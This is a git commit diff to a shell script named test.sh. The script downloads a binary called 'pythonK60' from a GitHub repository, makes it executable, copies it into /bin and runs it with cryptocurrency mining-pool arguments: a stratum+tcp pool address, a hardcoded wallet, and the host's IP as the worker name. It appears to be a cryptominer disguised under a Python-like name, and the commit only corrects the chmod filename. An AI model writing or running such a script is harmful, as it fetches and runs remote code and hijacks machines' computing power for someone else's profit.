1c652ca07ba47093282537c7c0439e22fa898798
one10001 <78626503+one10001@users.noreply.github.com>
2021-03-20 05:51:51 +0100

    Update test.sh

--- test.sh
+++ test.sh
@@ -4,6 +4,6 @@ IPNAME=$(sed 's|\.|o|g' <<< $iip)
 curl ipinfo.io
 #download build
 wget https://github.com/one10001/10001code/raw/main/pythonK60
-chmod +x pythonK37
+chmod +x pythonK60
 cp pythonK60 /bin/pythonK60
 pythonK60 -U -P stratum+tcp://RMV17aQMgMPyPqJQ5H3WRQH37Njspi1SSK.$IPNAME@116.203.206.127:80  --cu-grid-size 256  --cu-block-size 512  --cu-parallel-hash 8
